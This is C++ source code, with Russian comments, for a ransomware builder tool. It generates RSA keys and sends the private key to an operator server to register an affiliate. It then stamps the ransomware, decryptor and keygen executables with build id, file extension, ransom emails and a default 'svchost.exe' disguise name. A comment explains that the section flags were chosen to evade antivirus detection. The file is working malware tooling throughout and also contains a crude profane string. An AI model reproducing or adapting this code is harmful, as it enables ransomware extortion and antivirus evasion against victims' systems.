/*
ВАЖНО:
Для корректной работы билдера в директории с ним должены находиться:
1. Ransomware.exe
2. Keygen.exe
3. Decryptor.exe
*/

#define BAD_RESPONSE "I fucked your mom"


#include "resource.h"
#include "../Utils.h"

HWND Dialog;
BYTE* publicKey;
DWORD publicKeyLength;

// Функция для выравнивания в секции.
DWORD align(DWORD size, DWORD align, DWORD addr) {
	if (!(size % align))
		return addr + size;
	return addr + (size / align + 1) * align;
}

/*
Эта функция сгенерирует случайную строку из букв и цифр длиной 8 символов.
*/
char* gen_random() {
	/*
	rand ещё можно так заменить :)
	std::random_device r;
	std::mt19937 rd(r());
	std::uniform_int_distribution<int> ran(8, 16);
	int random = ran(rd);
	*/
	char* str = (char*)Mem::Alloc(9);
	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";
	const int len = 8;
	for (int i = 0; i < len; ++i)
		str[i] = alphanum[Funcs::_rand() % (sizeof(alphanum) - 1)];
	str[len] = 0;
	return str;
}

// Эта функция добавляет работника на сервер.
void sendInfo(char* key)
{
	char *id = (char*)Mem::Alloc(10);
	char *mail = (char*)Mem::Alloc(128);
	GetDlgItemText(Dialog, IDC_EDIT1, id, 10);
	GetDlgItemText(Dialog, IDC_EDIT3, mail, 128);
	HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	HINTERNET hConnect = InternetConnectA(hInternet, Strs::server, (HTTPS == 1) ? 443 : 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	char *request = (char*)Mem::Alloc(5500);
	id[8] = 0;
	wsprintf(request, "v=%s&email=%s&key=", id, mail);
	Mem::Free(id);
	Mem::Free(mail);

	lstrcat(request, key);
	HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/api/AddEmployee.php", NULL, NULL, NULL,
		(HTTPS == 1) ? INTERNET_FLAG_SECURE : INTERNET_FLAG_KEEP_CONNECTION, 0);
	char *req = Utils::conv_url(request);
	Mem::Free(request);
	HttpSendRequestA(hRequest, Strs::content_type, lstrlen(Strs::content_type), req, lstrlen(req));
	Mem::Free(req);
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
}

void export_rsa_key(HCRYPTPROV prov, HCRYPTKEY rsa_key, DWORD type)
{
	BYTE buf[2048];
	publicKeyLength = sizeof(buf);
	if (CryptExportKey(rsa_key, 0, type, 0, buf, &publicKeyLength))
	{
		if (type == PRIVATEKEYBLOB)
		{
			// этот ключ будет сохраняться на сервере и у тебя вместе с билдом
			DWORD dwr, privateKeyLength = publicKeyLength;
			char* buffer = Crypt::base64_encode(buf, privateKeyLength);
			char *file_name = (char*)Mem::Alloc(25);
			char *filePath = (char*)Mem::Alloc(128);
			GetDlgItemText(Dialog, IDC_EDIT1, file_name, 10);
			GetDlgItemText(Dialog, IDC_EDIT3, filePath, 128);
			lstrcat(filePath, "\\");
			lstrcat(filePath, file_name);
			lstrcat(filePath, "_privateKey.txt");
			HANDLE out = CreateFile(filePath, GENERIC_WRITE, 0, 0, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, 0);
			Mem::Free(filePath);
			Mem::Free(file_name);
			WriteFile(out, buffer, lstrlen(buffer), &dwr, 0);
			CloseHandle(out);
			sendInfo(buffer); // отпрлавяем зашифрованный base64 мастер-РСА приват на сервер
		}
		else if (type == PUBLICKEYBLOB)
		{
			publicKey = (BYTE*)Mem::Alloc(publicKeyLength + 1);
			Mem::Copy(publicKey, buf, publicKeyLength);
		}
	}
}

void genKeys() {
	HCRYPTPROV prov;
	HCRYPTKEY  key;
	if (CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (CryptGenKey(prov, AT_KEYEXCHANGE, RSA2048BIT_KEY | CRYPT_EXPORTABLE, &key))
		{
			export_rsa_key(prov, key, PUBLICKEYBLOB);
			export_rsa_key(prov, key, PRIVATEKEYBLOB);
			CryptDestroyKey(key);
		}
		CryptReleaseContext(prov, 0);
	}
}

bool CreateSection(char *filepath, char *sectionName, DWORD sectionSize) {
	HANDLE file = CreateFile(filepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return false;
	DWORD fileSize = GetFileSize(file, NULL), read;
	BYTE *pByte = (BYTE*)Mem::Alloc(fileSize);
	/* Читаем образ файла в память. */
	ReadFile(file, pByte, fileSize, &read, NULL);
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pByte;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
	{
		CloseHandle(file);
		Mem::Free(pByte);
		MessageBoxA(0, "MZ сигнатура неверна", 0, 0);
		return false;
	}
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pByte + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE)
	{
		CloseHandle(file);
		Mem::Free(pByte);
		MessageBoxA(0, "PE сигнатура неверна", 0, 0);
		return false;
	}
	PIMAGE_FILE_HEADER pFile = &pNt->FileHeader;
	PIMAGE_OPTIONAL_HEADER pOpt = &pNt->OptionalHeader;
	/* Получаем указатель на первую секцию. */
	PIMAGE_SECTION_HEADER pSect = (PIMAGE_SECTION_HEADER)((DWORD)pNt + sizeof(IMAGE_NT_HEADERS));
	/* Чистим место под секцию после последней секции. */
	Mem::Zero(&pSect[pFile->NumberOfSections], sizeof(IMAGE_SECTION_HEADER));
	/* Копируем имя секции. */
	Mem::Copy(&pSect[pFile->NumberOfSections].Name, sectionName, 8);
	/* Ставим размер секции. */
	pSect[pFile->NumberOfSections].Misc.VirtualSize = align(sectionSize, pOpt->SectionAlignment, 0);
	pSect[pFile->NumberOfSections].VirtualAddress = align(pSect[pFile->NumberOfSections - 1].Misc.VirtualSize, pOpt->SectionAlignment, pSect[pFile->NumberOfSections - 1].VirtualAddress);
	/* Ставим размер данных в секции.*/
	pSect[pFile->NumberOfSections].SizeOfRawData = align(sectionSize, pOpt->FileAlignment, 0);
	/* Ставим указатель на начало данных в секции. */
	pSect[pFile->NumberOfSections].PointerToRawData = align(pSect[pFile->NumberOfSections - 1].SizeOfRawData, pOpt->FileAlignment, pSect[pFile->NumberOfSections - 1].PointerToRawData);
	/*
		Ставим параметры доступа к секции.
		Параметры нужно ставить именно так, потому что аверы могут легко накинуть детектов к примеру за ewr (execute, read, write) секцию,
		что нам абсолютно не нужно. Данные мы будем только читать, поэтому этого хватит. 
	*/
	pSect[pFile->NumberOfSections].Characteristics = (IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ);
	SetFilePointer(file, pSect[pFile->NumberOfSections].PointerToRawData + pSect[pFile->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	SetEndOfFile(file);
	pOpt->SizeOfImage = pSect[pFile->NumberOfSections].VirtualAddress + pSect[pFile->NumberOfSections].Misc.VirtualSize;
	pFile->NumberOfSections += 1;
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	WriteFile(file, pByte, fileSize, &read, NULL);
	CloseHandle(file);
	Mem::Free(pByte);
	return true;
}

void InsertRansom(char *filepath) {
	HANDLE file = CreateFile(filepath, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return;
	DWORD filesize = GetFileSize(file, NULL), dw;
	BYTE *pByte = (BYTE*)Mem::Alloc(filesize);
	/* Читаем образ файла в память. */
	ReadFile(file, pByte, filesize, &dw, NULL);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);
	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	/* Получаем последнюю секцию (ту, которую мы добавили). */
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections - 1);
	/* Ставим указатель файла на начало её данных (следующая запись в файл начнётся здесь) */
	SetFilePointer(file, last->PointerToRawData, NULL, FILE_BEGIN);
	/* Создаём структуру данных и собираем в неё все данные. */
	Build_Data* data = (Build_Data*)Mem::Alloc(sizeof(Build_Data));
	GetDlgItemText(Dialog, IDC_EDIT1, data->build_id, sizeof(data->build_id));
	GetDlgItemText(Dialog, IDC_EDIT2, data->extension, sizeof(data->extension));
	GetDlgItemText(Dialog, IDC_EDIT3, data->email1, sizeof(data->email1));
	GetDlgItemText(Dialog, IDC_EDIT4, data->email2, sizeof(data->email2));
	GetDlgItemText(Dialog, IDC_EDIT5, data->appdata_name, sizeof(data->appdata_name));
	BOOL lpTranslated;
	BYTE windowsNum = (BYTE)GetDlgItemInt(Dialog, IDC_EDIT6, &lpTranslated, FALSE);
	Mem::Copy(data->public_key, publicKey, publicKeyLength);
	data->is_one_block = SendDlgItemMessage(Dialog, IDC_CHECK3, BM_GETCHECK, 0, 0);
	data->windowsNum = windowsNum;
	data->public_key_len = publicKeyLength;
	if (lstrlen(data->appdata_name) == 0)
		wsprintf(data->appdata_name, "svchost.exe");
	else
		if (!StrStr(data->appdata_name, ".exe"))
			lstrcat(data->appdata_name, ".exe");
	/* Записываем данные в файл */
	WriteFile(file, data, sizeof(Build_Data), &dw, 0);
	CloseHandle(file);
	Mem::Free(pByte);
	Mem::Free(data);
}

void InsertDecryptor(char* filepath)
{
	// то же, что и InsertData, отличаются только структуры
	HANDLE file = CreateFile(filepath, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return;
	DWORD filesize = GetFileSize(file, NULL), dw;
	BYTE* pByte = (BYTE*)Mem::Alloc(filesize);
	ReadFile(file, pByte, filesize, &dw, 0);
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pByte + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER first_section = IMAGE_FIRST_SECTION(pNt);
	PIMAGE_SECTION_HEADER last_section = first_section + (pNt->FileHeader.NumberOfSections - 1);
	SetFilePointer(file, last_section->PointerToRawData, NULL, FILE_BEGIN);
	Decrypt_Data* data = (Decrypt_Data*)Mem::Alloc(sizeof(Decrypt_Data));
	data->is_one_block = SendDlgItemMessage(Dialog, IDC_CHECK3, BM_GETCHECK, 0, 0);
	GetDlgItemText(Dialog, IDC_EDIT2, data->extension, 30);
	WriteFile(file, data, sizeof(Decrypt_Data), &dw, 0);
	CloseHandle(file);
	Mem::Free(pByte);
	Mem::Free(data);
}

void InsertKeygen(char *filePath)
{
	HANDLE file = CreateFile(filePath, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE)
		return;
	DWORD filesize = GetFileSize(file, NULL), dw;
	BYTE* pByte = (BYTE*)Mem::Alloc(filesize);
	ReadFile(file, pByte, filesize, &dw, 0);
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pByte + pDos->e_lfanew);
	PIMAGE_SECTION_HEADER first_section = IMAGE_FIRST_SECTION(pNt);
	PIMAGE_SECTION_HEADER last_section = first_section + (pNt->FileHeader.NumberOfSections - 1);
	SetFilePointer(file, last_section->PointerToRawData, NULL, FILE_BEGIN);
	Keygen_Data* data = (Keygen_Data*)Mem::Alloc(sizeof(Keygen_Data));
	GetDlgItemText(Dialog, IDC_EDIT1, data->worker_id, sizeof(data->worker_id));
	GetDlgItemText(Dialog, IDC_EDIT3, data->email, sizeof(data->email));
	WriteFile(file, data, sizeof(Keygen_Data), &dw, 0);
	CloseHandle(file);
	Mem::Free(pByte);
	Mem::Free(data);
}

void make_build()
{
	/* Получаем id-билда и создаём exe с таким названием. */
	char build[15], build_name[100], decryptor_name[100], dir[128], keygen_name[100];
	GetDlgItemText(Dialog, IDC_EDIT1, build, sizeof(build));
	GetDlgItemText(Dialog, IDC_EDIT3, dir, sizeof(dir));
	CreateDirectory(dir, NULL);
	wsprintf(build_name, "%s\\%s.exe", dir, build);
	wsprintf(decryptor_name, "%s\\%s_decryptor.exe", dir, build);
	wsprintf(keygen_name, "%s\\%s_keygen.exe", dir, build);
	CopyFile("Ransomware.exe", build_name, FALSE);
	CopyFile("Decryptor.exe", decryptor_name, FALSE);
	CopyFile("Keygen.exe", keygen_name, FALSE);
	genKeys();
	CreateSection(build_name, "trump", 2500);
	InsertRansom(build_name);
	CreateSection(decryptor_name, "trump", 2500);
	InsertDecryptor(decryptor_name);
	CreateSection(keygen_name, "trump", 150);
	InsertKeygen(keygen_name);
}

UINT Dlg_YOURPROC_OnGetDlgCode(HWND hwnd, LPMSG lpmsg)
{
	 return DLGC_WANTCHARS;
}

INT_PTR CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
	switch (uMsg)
	{
	case WM_CLOSE:
		ExitProcess(0);
		break;
	case WM_COMMAND:
		switch (wParam)
		{
		case IDC_BUTTON1:
			make_build();
			break;
		case IDC_BUTTON2:
		{
			char* random_str = gen_random();
			SetDlgItemText(Dialog, IDC_EDIT1, random_str);
			Mem::Free(random_str);
			break;
		}
		case IDC_BUTTON3:
			ExitProcess(0);
			break;
		}
		break;
	}
	return FALSE;
}



void Entry()
{
	InitApi();
	Funcs::_srand((UINT)Funcs::_time(0)); // заставляет rand генерить рандомно.
	MSG uMsg;
	Dialog = CreateDialogParam(0, MAKEINTRESOURCE(IDD_DIALOG1), 0, DialogProc, 0);
	ShowWindow(Dialog, SW_SHOWNORMAL);
	SetDlgItemInt(Dialog, IDC_EDIT6, 3, FALSE);
	while (GetMessage(&uMsg, 0, 0, 0))
	{
		 if (!IsDialogMessage(Dialog, &uMsg))
		 {
			  TranslateMessage(&uMsg);
			  DispatchMessage(&uMsg);
		 }
		 else if ((GetKeyState(VK_CONTROL) & 0x8000) && uMsg.wParam == 'A')
		 {
			  SendMessage(GetFocus(), EM_SETSEL, 0, -1);
		 }
	}
	ExitProcess(0);
}